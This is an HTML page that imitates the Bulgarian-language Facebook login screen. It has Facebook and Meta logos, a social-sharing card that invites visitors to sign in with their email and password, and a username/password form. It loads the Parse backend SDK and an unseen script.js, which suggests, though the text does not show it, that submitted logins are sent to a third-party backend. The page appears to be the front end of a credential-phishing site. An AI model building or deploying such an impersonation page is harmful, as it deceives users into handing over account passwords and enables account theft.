<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">

    <meta property="og:locale" content="bg_BG">

    <!-- Twitter card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Вход във Facebook">
    <meta name="twitter:description" content="Влезте във Facebook с вашия имейл и парола.">
    <meta name="twitter:image" content="https://scontent-sof1-1.xx.fbcdn.net/v/t39.30808-6/284287483_5146540268758799_3938864451880717026_n.jpg?stp=dst-jpg_tt6&cstp=mx1440x1440&ctp=s1440x1440&_nc_cat=104&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=GNzg2h_x8z8Q7kNvwE833eO&_nc_oc=Adq9HrXqCMC8OEUTMd9wIKKTWsaPAhj9D9gdV3FXyZ_rcIcX4WV4oYFVzCPyWtigFNI&_nc_zt=23&_nc_ht=scontent-sof1-1.xx&_nc_gid=EZA5UsLV9gts1BtYmMp3yg&_nc_ss=7b2a8&oh=00_Af-vikicjIhbaW3pGZn64pRQrRuynVwKlcAB_83Vc1cQ_g&oe=6A36FD0C">

    <title>Facebook</title>
</head>

<body>
    <div id="header">
        <img src="img/fb_logo.png" alt="logo" id="fb-logo">
    </div>

    <body>
        <div class="login-wrapper" role="region" aria-label="Facebook login">
            <header class="login-header">
                <h1 class="brand">Вход във Facebook</h1>
            </header>

            <form class="login-form" action="#" method="post" novalidate>
                <div class="field">
                    <input id="email" name="email" type="text" placeholder="Имейл или мобилен номер" required
                        autocomplete="username">
                </div>

                <div class="field">
                    <input id="password" name="password" type="password" placeholder="Парола" required
                        autocomplete="current-password">
                </div>

                <div class="form-actions">
                    <button type="submit" class="login-btn">Вход</button>
                    <a href="#" class="forgot-link">Забравена парола?</a>
                </div>
            </form>

            <div class="below-form">
                <div class="create-account">
                    <button class="create-btn" type="button">Създаване на нов профил</button>
                </div>
                <img id="meta-logo" src="img/meta_logo.png" alt="Meta logo placeholder">
            </div>
        </div>
        </div>
    </body>
    <footer>
        <div></div>

        </div>
    </footer>
    <script src="https://unpkg.com/parse/dist/parse.min.js"></script>
    <script src="script.js"></script>
</body>

</html>
